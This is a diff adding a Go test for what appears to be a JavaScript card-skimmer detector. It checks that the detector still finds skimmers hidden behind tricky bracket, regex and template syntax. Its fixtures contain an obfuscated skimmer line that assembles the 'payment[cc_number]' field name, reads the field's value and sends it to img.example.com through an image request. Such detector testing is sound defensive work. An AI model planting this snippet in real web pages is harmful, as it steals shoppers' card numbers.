@@ -208,3 +208,32 @@ func TestSkimmerEvasions(t *testing.T) {
 		t.Errorf("the package updated as a whole is not named: %q", issues)
 	}
 }
+
+// What a bracket opened decides a "/" after it only where a tokenizer is sure; a conditional's
+// object, a class extending a function, a line break after return, for await and a template
+// substitution are read without hiding the strings built after them.
+func TestSkimmerAfterUncertainBrackets(t *testing.T) {
+	use := `var f=document.querySelector('[name="'+s+'"]');new Image().src="https://img.example.com/p?d="+f.value`
+	build := `var s='payment[c'+'c_n'+'umber]';`
+	for name, before := range map[string]string{
+		"ternary object":          "var q=1?0:{}/1;" + build + "var z=1/2;",
+		"class extends function":  "var q=class extends (function(){}){}/1;" + build + "var z=1/2;",
+		"return and a line break": "function g(){return\n{}/'/.test(1)};" + build,
+		"for await":               "async function h(){for await(const x of [])/'/.test(1)};" + build,
+		"template substitution":   "var t=`${1}'`;" + build + "var u=`'`;",
+		"template far before":     "var h=`${1}`;" + strings.Repeat("var a=1;", 700) + build,
+	} {
+		if skimmerSignals([]byte(before+use)) == nil {
+			t.Errorf("%s: not found", name)
+		}
+	}
+	// The brackets open where a piece ends go on in the next: a "(" one piece before its ")".
+	src := []byte("var q,s;{if(1){q=(1" + strings.Repeat(" ", skimmerChunk+skimmerChunk/2) + ")/2}/'/.test(1)}{" + build + "}\n" + use)
+	var fam skimmerFamilies
+	for off := 0; off < len(src); off += skimmerChunk {
+		fam.scan(src[off:min(len(src), off+skimmerChunk+skimmerOverlap)])
+	}
+	if fam.verdict() == nil {
+		t.Error("brackets across pieces: not found")
+	}
+}
